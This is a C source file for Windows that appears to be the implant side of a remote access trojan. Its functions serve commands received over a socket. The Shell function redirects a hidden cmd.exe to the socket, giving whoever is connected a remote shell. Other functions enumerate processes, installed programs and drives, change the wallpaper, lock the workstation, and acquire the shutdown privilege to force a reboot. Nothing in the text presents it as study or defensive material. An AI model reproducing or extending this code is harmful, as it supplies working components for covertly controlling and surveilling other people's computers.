#include "system_func.h"
#include "Utils.h"
#include <tlhelp32.h>
#include <stdio.h>


#pragma pack(1)

typedef struct ps_info
{
    DWORD pid;
    DWORD ppid;
    DWORD nthd;
    char exe[MAX_PATH];
}PS_INFO , * PPS_INFO;



BYTE Is_Sent(SOCKET sock,int timeout)
{
    WSAPOLLFD fd;

    fd.fd = sock;
    fd.events = POLLWRNORM;
    fd.revents = 0;

    int ret = WSAPoll(&fd,1,timeout);

    if (ret > 0)
    {
        if ( (fd.revents & POLLERR) || (fd.revents & POLLHUP) )
        {
            return 0;
        }

        if(fd.revents & POLLWRNORM)
        {
            return 1;
        }

    }
    else
    {
        return 0;
    }

    return 0;
}



int Shell(SOCKET sock)
{
    PROCESS_INFORMATION pi;
    STARTUPINFOA st;
    SYS_ERROR err;

    err.code = 200;

    ZeroMemory(&pi,sizeof(pi));
    ZeroMemory(&st,sizeof(st));

    st.cb = sizeof(st);
    st.hStdError = st.hStdInput = st.hStdOutput = (HANDLE)sock;
    st.dwFlags = STARTF_USESTDHANDLES;

    if(!CreateProcessA(NULL,"cmd.exe",NULL,NULL,1,CREATE_NO_WINDOW | CREATE_SUSPENDED,NULL,NULL,&st,&pi))
    {
        err.code = 404;
        err.reason = GetLastError();
        send(sock,(char *)&err,sizeof(err),0);

        if(!Is_Sent(sock,10000))
        {
            return 404;
        }
        return 0;
    }

     send(sock,(char *)&err,sizeof(err),0);
     ResumeThread(pi.hThread);
     WaitForSingleObject(pi.hProcess,INFINITE);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);

     return 0;

}


int List_Process(SOCKET sock)
{
    HANDLE snap;
    PROCESSENTRY32 ps;
    SYS_ERROR err;
    BYTE ps_info[276];





    if((snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0))==INVALID_HANDLE_VALUE)
    {
        err.code = 404;
        err.reason = GetLastError();
        send(sock,(char *)&err,sizeof(err),0);
        printf("CreateToolhelp32Snapshot() Failed");
        goto __Cleanup;
    }

    ZeroMemory(&ps,sizeof(ps));
    ps.dwSize = sizeof(PROCESSENTRY32);

    if(!Process32First(snap,&ps))
    {
        err.code = 404;
        err.reason = GetLastError();
        send(sock,(char *)&err,sizeof(err),0);
        printf("Process32First() Failed");
        goto __Cleanup;
    }

    *(PDWORD)ps_info = 200;

    do
    {
        PPS_INFO p = (PPS_INFO)&ps_info[4];
        p->pid = ps.th32ProcessID;
        p->ppid = ps.th32ParentProcessID;
        p->nthd = ps.cntThreads;
        CopyMemory(p->exe,ps.szExeFile,MAX_PATH);
        send(sock,(char *)ps_info,sizeof(ps_info),0);
        if(!Is_Sent(sock,10000))
        {
            CloseHandle(snap);
            return 404;
        }
    }while(Process32Next(snap,&ps));

    *(PDWORD)ps_info = 0;
    send(sock,(char *)ps_info,4,0);


    __Cleanup:
        if(snap!=INVALID_HANDLE_VALUE)
        {
            CloseHandle(snap);
        }

        return 0;
}


int Change_Wallpaper(SOCKET sock)
{
    char path[260];
    ZeroMemory(path,260);
    SYS_ERROR err;

    recv(sock,path,260,0);

    err.code = 200;

    if(!SystemParametersInfoA(SPI_SETDESKWALLPAPER,0,path,SPIF_UPDATEINIFILE))
    {
        err.code = 404;
        err.reason = GetLastError();
    }

    send(sock,(char *) &err , 8,0);
    if(!Is_Sent(sock,10000))
        return 404;

    return 0;

}


void Lock_Window(SOCKET sock)
{
    SYS_ERROR err;

    err.code  = 200;
    if(!LockWorkStation())
    {
        err.code = 404;
        err.reason = GetLastError();
    }

    send(sock,(char *)&err,sizeof(err),0);

}

void Reboot(SOCKET sock)
{
    SYS_ERROR err;
    HANDLE h=NULL;
    TOKEN_PRIVILEGES token;
    SHUTDOWN_OP op;
    char msg[260];

    err.code = 200;

    ZeroMemory(msg,260);
    recv(sock,(char *)&op,sizeof(op),0);
    recv(sock,msg,260,0);


    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&h))
    {
        err.code = 404;goto __CleanUp;
    }

    if(!LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&token.Privileges[0].Luid))
    {
        err.code = 404;goto __CleanUp;
    }

    token.PrivilegeCount = 1;
    token.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if(!AdjustTokenPrivileges(h,FALSE,&token,0,NULL,NULL))
    {
        err.code = 404;goto __CleanUp;
    }

    if(!InitiateSystemShutdownA(NULL,msg,op.timeout,op.forced,op.Restart))
    {
        err.code = 404;goto __CleanUp;
    }
    __CleanUp:

    if(err.code == 404)
    {
        err.reason = GetLastError();
    }

    if(h)
        CloseHandle(h);

    send(sock,(char *)&err,sizeof(err),0);

}


void List_Installed(SOCKET sock)
{
    HKEY hkey=NULL;
    SYS_ERROR err;
    DWORD nSubKey;
    char subkey[255];
    LPVOID value=NULL;
    DWORD i ;
    err.code = 404;
    err.reason = 0;
    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall",0,KEY_READ,&hkey))
    {
        goto __Cleanup;
    }

    if(RegQueryInfoKeyA(hkey,NULL,NULL,NULL,&nSubKey,NULL,NULL,NULL,NULL,NULL,NULL,NULL))
    {
        goto __Cleanup;
    }


    value = malloc(16387);

    if(value==NULL)
        goto __Cleanup;


    for(i=0;i<nSubKey;i++)
    {
        DWORD cb = 255;
        if(RegEnumKeyExA(hkey,i,subkey,&cb,NULL,NULL,NULL,NULL)==ERROR_SUCCESS)
        {
            cb = 16383;

            if(RegGetValueA(hkey,subkey,"DisplayName",RRF_RT_REG_SZ,NULL,value+4,&cb)==ERROR_SUCCESS)
            {
                *(PDWORD)value = cb;
                send(sock,(char *)value,cb+4,0);
            }
        }
    }

    err.code = 200;
    __Cleanup:
        if(err.code == 404)
        {
            err.reason = GetLastError();
        }
        send(sock,(char *)&err,sizeof(err),0);
        if(value)
        {
            free(value);
        }

        if(hkey)
            RegCloseKey(hkey);
}

void List_Disk(SOCKET sock)
{
    DRIVE_INFO * driveinfo;
    BYTE buf[28];
    ZeroMemory(buf,sizeof(buf));

    DWORD drivemask;
    SYS_ERROR err;
    char letter = 'A';
    driveinfo = (DRIVE_INFO * )&buf[4];



    err.code = 200;

    if((drivemask=GetLogicalDrives())==0)
    {
        err.code = 404;
        err.reason = GetLastError();
        send(sock,(char *)&err,sizeof(err),0);
        return ;
    }

    while(drivemask)
    {
        if(drivemask & 1)
        {
            driveinfo->name[0]=letter;
            driveinfo->name[1]=':';
            //driveinfo->name[2]='\\';

            *(PDWORD)buf = GetDriveTypeA(driveinfo->name);

            if(!GetDiskFreeSpaceA(driveinfo->name,&driveinfo->SectorsPerCluster,&driveinfo->BytesPerSector,&driveinfo->NumberOfFreeClusters,&driveinfo->TotalNumberOfClusters))
            {
                driveinfo->failled = GetLastError();
            }
            send(sock,(char *)buf,sizeof(buf),0);
            ZeroMemory(buf,sizeof(buf));
        }

        letter++;
        drivemask >>= 1;
    }

    drivemask = 200;
    send(sock,(char *)&drivemask,4,0);
}
